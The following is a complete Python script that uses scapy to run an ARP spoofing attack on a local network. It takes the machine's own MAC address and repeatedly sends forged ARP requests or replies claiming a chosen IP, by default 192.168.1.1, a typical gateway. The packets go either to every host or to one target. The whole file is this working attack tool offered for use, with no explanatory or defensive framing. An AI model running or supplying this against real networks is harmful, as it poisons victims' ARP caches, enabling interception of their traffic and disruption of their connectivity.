import uuid
import re
import scapy.all
from scapy.all import (ARP,Ether,sendp,getmacbyip)
from optparse import OptionParser
def get_mac():
	node = uuid.getnode()
	mac = uuid.UUID(int = node).hex[-12:]
	tmp = re.findall(r'.{2}',mac)
	mac = ':'.join(tmp)
	return mac
def build_rep(hwsrc=None,hwdst=None,psrc=None,pdst=None,op=None):
	if	op==None:
            op=1
	if pdst==None:
		hwdst='ff:ff:ff:ff:ff:ff'
		pkt = Ether(src=hwsrc,dst=hwdst)/ARP(hwsrc=hwsrc,psrc=psrc,op=op)
        else:
            pkt = Ether(src=hwsrc,dst=hwdst)/ARP(hwsrc=hwsrc,hwdst=hwdst,psrc=psrc,pdst=pdst,op=op)
	return pkt

def main():
	usage = 'Usage: %prog [-i interface] [-t target] host'
	parser = OptionParser(usage)
	parser.add_option('-i',type='string',dest='interface',default='eth0',help='The interface to use')
	parser.add_option('-t',type='string',dest='target',default=None,help='Your destination')
	parser.add_option('-m',type='int',dest='op',default=1,help='default:1 requset:1 reponse:2')
	parser.add_option('-o',type='string',dest='psrc',default='192.168.1.1',help='Yours ip')
	(option,args)=parser.parse_args()
	hwsrc=get_mac()
	if option.target is None:
		psrc=option.psrc
		pkt=build_rep(hwsrc=hwsrc,psrc=psrc,op=option.op)
	else:
		hwdst=getmacbyip(option.target)
		pkt=build_rep(hwsrc=hwsrc,hwdst=hwdst,psrc=option.psrc,pdst=option.target,op=option.op)
	while True:
		sendp(pkt,inter=2,iface=option.interface)

if __name__=='__main__':
	main()
